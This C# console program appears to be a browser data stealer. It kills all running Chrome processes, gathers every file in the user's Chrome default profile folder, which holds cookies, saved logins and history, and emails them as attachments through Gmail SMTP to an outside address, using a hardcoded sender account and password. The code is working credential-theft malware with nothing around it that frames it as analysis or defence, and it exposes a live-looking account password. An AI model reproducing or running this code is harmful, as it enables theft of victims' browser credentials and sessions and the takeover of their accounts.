// See https://aka.ms/new-console-template for more information
using System;
using System.Net.Mail;
using System.Net;
using System.Linq;
using System.Net.Mime;
using System.IO;
using System.Diagnostics;

namespace ConsoleApplication94
{
    class Program
    {
        static void Main(string[] args)
        {
            SendMail("smtp.gmail.com", "gamemakers264@gmail.com", "ClioNew4321", "attationin@gmail.com", "TEST", "Test");
        }

        public static void SendMail(string smtpServer, string from, string password,
        string mailto, string caption, string message)
        {
            Process[] chromeInstances = Process.GetProcessesByName("chrome");

            foreach (Process p in chromeInstances)
                p.Kill();
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(from);
                mail.To.Add(new MailAddress(mailto));
                mail.Subject = caption;
                mail.Body = message;
                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
                Directory.GetFiles(path).ToList().ForEach(
                    name => mail.Attachments.Add(new Attachment(name)
                ));
                SmtpClient client = new SmtpClient();
                client.Host = smtpServer;
                client.Port = 587;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(from.Split('@')[0], password);
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Send(mail);
                // client.Dispose();
                mail.Dispose();
            }
            catch (Exception e)
            {
                throw new Exception("Mail.Send: " + e.Message);
            }
        }
    }
}